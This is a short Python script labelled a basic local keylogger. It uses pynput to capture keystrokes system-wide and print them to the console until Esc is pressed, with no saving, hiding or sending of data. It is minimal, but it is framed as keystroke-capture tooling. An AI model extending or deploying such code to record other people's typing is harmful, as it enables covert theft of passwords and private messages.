# Basic Python Keylogger (local)
import pynput

from pynput.keyboard import Key, Listener  # Listen for key events
import logging

# Define 'on_press' function
def on_press(key): 
    print('{0} pressed'.format (key))   # Print (key) character in the {}string

# Define 'on_release' functon
def on_release(key): 
    if key == Key.esc:                  # Break out of the loop if esc key is hit
        return False

# Add functions to when key is press or release
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()                     # This is a loop that will constantly run until it is stopped
